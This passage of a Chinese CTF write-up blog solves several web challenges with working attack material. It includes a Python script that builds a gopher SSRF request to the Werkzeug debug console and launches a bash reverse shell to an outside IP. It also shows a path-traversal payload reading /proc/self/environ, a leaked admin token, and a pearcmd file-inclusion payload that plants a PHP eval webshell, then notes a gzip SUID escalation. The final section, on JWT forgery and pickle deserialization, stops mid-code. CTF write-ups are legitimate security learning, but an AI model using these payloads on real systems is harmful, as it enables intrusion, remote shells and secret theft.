携带cookie直接rce即可</p><p>直接反弹shell 记得url编码一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.<span class="property">parse</span></span><br><span class="line"><span class="keyword">import</span> urllib.<span class="property">request</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">PAYLOAD</span>(s,cmd,host,cookie):</span><br><span class="line"></span><br><span class="line">    poc = f<span class="string">&quot;&quot;</span><span class="string">&quot;GET /console?&amp;__debugger__=yes&amp;cmd=&#123;cmd&#125;&amp;frm=0&amp;s=&#123;s&#125; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: &#123;host&#125;</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Cookie: &#123;cookie&#125;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    new_poc = urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(poc).<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">    res = f<span class="string">&#x27;gopher://&#123;host&#125;/_&#x27;</span> + new_poc</span><br><span class="line">    <span class="title function_">print</span>(res)</span><br><span class="line">    <span class="keyword">return</span> urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.130.34.53%2F7777%20%3C%261%5C%22%22)&#x27;</span></span><br><span class="line">s= <span class="string">&quot;hCYJBiBvCDHEJqflrGtk&quot;</span></span><br><span class="line">host=<span class="string">&quot;127.0.0.1:1314&quot;</span></span><br><span class="line">cookie = <span class="string">&quot;__wzd41acf1cefa50cf0ead64=1698485090|9b48530259cc&quot;</span></span><br><span class="line">pin = <span class="string">&quot;397-838-235&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="title function_">PAYLOAD</span>(s,cmd,host,cookie)</span><br><span class="line"><span class="title function_">print</span>(a)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485894959-0305c6d9-dc23-41b2-987e-74979132cf72.png" alt="img"></p><p>成功！！！</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485737899-0a1ec05c-caea-4355-b599-bc7798a61086.png" alt="img"></p><h2 id="NextDrive"><a href="#NextDrive" class="headerlink" title="NextDrive"></a>NextDrive</h2><p>最折磨出题人的一集</p><p>趣味题目</p><p>一个模拟百度网盘的题目</p><p>首先申请一个账号然后登录</p><p>根据提示</p><p>Hint2: 你知道秒传的原理吗？</p><p>那么首先了解一下秒传的原理</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698486990058-e84113fd-3c61-496c-84d6-f1b3a796fc9d.png" alt="img"></p><p>在公共资源区能找到test.res.http文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line">content-<span class="attr">type</span>: application/json; charset=utf-<span class="number">8</span></span><br><span class="line">content-<span class="attr">length</span>: <span class="number">50</span></span><br><span class="line"><span class="attr">date</span>: <span class="title class_">Tue</span>, <span class="number">06</span> <span class="title class_">Oct</span> <span class="number">2023</span> <span class="number">13</span>:<span class="number">39</span>:<span class="number">21</span> <span class="variable constant_">GMT</span></span><br><span class="line"><span class="attr">connection</span>: keep-alive</span><br><span class="line">keep-<span class="attr">alive</span>: timeout=<span class="number">5</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;success&quot;</span>,<span class="string">&quot;logged&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">27471829</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486253740</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Windows 12 Concept.png&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">440707</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486256209</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;Windows 12 Concept.png&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">330767</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486256242</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;不限速，就是快！.jpg&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">32920</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486256280</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;不限速，就是快！.jpg&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;09228aabeb472316022cedd3f1a76930558f0ea489bd65b32ba743e499b74182&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">1085</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486259714</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p>可以看到是发包数据包 </p><p>注意到还有一个test.req.http上传了但是文件没有显示出来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;09228aabeb472316022cedd3f1a76930558f0ea489bd65b32ba743e499b74182&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">1085</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486259714</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以利用秒传的原理随便上传一个文件 下载时替换test.req.http的哈希值 那么就可以将test.req.http文件下载下来了</p><p>得到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /api/info/drive/sharezone <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Accept</span>: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cache-Control: no-cache</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Content-Length: 0</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Cookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiI5ODRkMTIyMDQ5YmExNTM2MmYzNTEyZWYyNmE5YzUyMGY2NzBiYzNjYjJiMzhiODRhZWU0NzAzNDAwMzg2MWM3In0uCQ9dVhxMfi1WChcEdxJoYQ.TA1XZ2MKFgcQRRRmW18PDEAJUmBgDURXEUFFMAwJWloQXVIybl9BUkFBFTVbC1YOQgxWZmVcFldHQRZnWgMLUkJdVmZnW0lUTBNPMFsOVwlGClY2YlZCVEFARjVRCwtTQ11Wb2ZcSVJCE09iWlgIXUxcUDQyXBUHRkBPY1gDWF8</span></span><br><span class="line"><span class="comment">Host: localhost:21920</span></span><br><span class="line"><span class="comment">Origin: http://localhost:21920</span></span><br><span class="line"><span class="comment">Pragma: no-cache</span></span><br><span class="line"><span class="comment">Referer: http://localhost:21920/sharezone</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: empty</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: cors</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0</span></span><br><span class="line"><span class="comment">sec-ch-ua: &quot;Microsoft Edge&quot;;v=&quot;119&quot;, &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;</span></span><br><span class="line"><span class="comment">sec-ch-ua-mobile: ?0</span></span><br><span class="line"><span class="comment">sec-ch-ua-platform: &quot;Windows&quot;</span></span><br></pre></td></tr></table></figure><p>那么我们就拿到了admin的token了 然后替换token伪造身份</p><p>又多了点文件 不过重要的是share.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../../runtime.config.json&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Res</span> = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/response&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">FileSignUtil</span> = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/file-signature&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">DriveUtil</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/database.utilities&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; verifySession &#125; = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> logger = <span class="variable language_">global</span>.<span class="property">logger</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@deprecated</span></span></span><br><span class="line"><span class="comment"> * ! <span class="doctag">FIXME:</span> 发现漏洞，请进行修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/s/:hashfn&quot;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> hash_fn = <span class="title class_">String</span>(ctx.<span class="property">params</span>.<span class="property">hashfn</span> || <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> hash = hash_fn.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">const</span> from_uid = ctx.<span class="property">query</span>.<span class="property">from_uid</span></span><br><span class="line">    <span class="keyword">const</span> custom_fn = ctx.<span class="property">query</span>.<span class="property">fn</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> hash_fn !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> from_uid !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// invalid params or query</span></span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Invalid Params&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">400</span>; <span class="comment">// Bad Request</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否为共享的文件</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">IS_FILE_EXIST</span> = <span class="keyword">await</span> <span class="title class_">DriveUtil</span>.<span class="title function_">isShareFileExist</span>(hash, from_uid)</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">IS_FILE_EXIST</span>) &#123;</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;File Not Found&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">404</span>; <span class="comment">// Not Found</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 系统中是否存储有该文件</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span>) &#123;</span><br><span class="line">        logger.<span class="title function_">error</span>(<span class="string">`File <span class="subst">$&#123;hash_fn.yellow&#125;</span> not found in storage, but exist in database!`</span>)</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Internal Server Error&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件名处理</span></span><br><span class="line">    <span class="keyword">let</span> filename = <span class="keyword">typeof</span> custom_fn === <span class="string">&quot;string&quot;</span> ? custom_fn : (<span class="keyword">await</span> <span class="title class_">DriveUtil</span>.<span class="title function_">getFilename</span>(from_uid, hash));</span><br><span class="line">    filename = filename.<span class="title function_">replace</span>(<span class="regexp">/[\\\/\:\*\&quot;\&#x27;\&lt;\&gt;\|\?\x00-\x1F\x7F]/gi</span>, <span class="string">&quot;_&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送</span></span><br><span class="line">    ctx.<span class="title function_">set</span>(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">`attachment; filename*=UTF-8&#x27;&#x27;<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(filename)&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))</span></span><br><span class="line">    <span class="keyword">await</span> ctx.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">CONFIG</span>.<span class="property">storage_path</span>, hash_fn)).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        logger.<span class="title function_">error</span>(<span class="string">`Error while sending file <span class="subst">$&#123;hash_fn.yellow&#125;</span>`</span>)</span><br><span class="line">        logger.<span class="title function_">error</span>(e)</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>这里就稍稍寄了 由于js题目做的少 看js代码逻辑很吃力 最后还是折磨出题师傅出的qwq</p><p>hash_fn是整个文件的hash</p><p>hash取了hash_fn前64个字符校验是否是分享的文件 如果是则会将文件内容读出来</p><p>但是问题出在了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span> = fs.<span class="title function_">existsSync</span>(path.<span class="title function_">resolve</span>(</span><br><span class="line">            , hash_fn))</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Internal Server Error&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>它校验时是否为分享文件取的是hash 但是读文件是通过hash_fn</p><p>那么我们可以让前64个hash值为任意分享的文件hash值 之后的内容为<code>../../../../../proc/self/environ</code> 就可以将内容读出来</p><p>payload：<code>/s/任意分享文件的hash值/../../../../../proc/self/environ?from_uid=100000&amp;fn=/proc/self/environ</code> 记得要url编码 不然会混淆导致重定向到主页&#x2F;(ㄒoㄒ)&#x2F;~~</p><h2 id="4-复盘-未解出"><a href="#4-复盘-未解出" class="headerlink" title="4-复盘(未解出)"></a>4-复盘(未解出)</h2><p>原来这个题考pearcmd啊🤔 跟着官方wp学习</p><p>index.php关键代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">         $page =<span class="string">&#x27;pages/&#x27;</span> .<span class="property">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         $page = <span class="string">&#x27;pages/dashboard.php&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_">file_exists</span>($page)) &#123;</span><br><span class="line">         require_once $page; </span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         require_once <span class="string">&#x27;pages/error_page.php&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>存在文件包含 然后就直接payload🤔🤔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;page=/../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[x])?&gt;+/var/www/html/1.php</span><br></pre></td></tr></table></figure><p>之后是一个suid提权 gzip的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698838298382-580e4d6d-f28d-40e7-a0e4-00f6420608e6.png" alt="img"></p><p>🤔🤔  </p><h2 id="Ye’s-Pickle（未解出"><a href="#Ye’s-Pickle（未解出" class="headerlink" title="Ye’s Pickle（未解出)"></a>Ye’s Pickle（未解出)</h2><p>找到原题了 不敢实践。。。rz 原题是祥云杯2022 的FunWEB</p><p>考点：</p><ul><li>jwt伪造</li><li>pickle反序列化</li></ul><p>源码:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># -*- <span class="attr">coding</span>: utf-<span class="number">8</span> -*-</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.<span class="property">jwk</span> <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">generate_random_string</span>(length=<span class="number">16</span>):</span><br><span class="line">    characters = string.<span class="property">ascii_letters</span> + string.<span class="property">digits</span>  # 包含字母和数字</span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.<span class="title function_">join</span>(random.<span class="title function_">choice</span>(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.<span class="property">config</span>[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="title function_">generate_random_string</span>(<span class="number">16</span>)</span><br><span class="line">key = jwk.<span class="property">JWK</span>.<span class="title function_">generate</span>(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_">index</span>():</span><br><span class="line">    payload=request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">payload</span>:</span><br><span class="line">        token=<span class="title function_">verify_jwt</span>(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = <span class="title function_">generate_jwt</span>(user, key, <span class="string">&#x27;PS256&#x27;</span>, <span class="title function_">timedelta</span>(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/pickle&quot;</span>)</span><br><span class="line">def <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.<span class="title function_">loads</span>(base64.<span class="title function_">b64decode</span>(request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        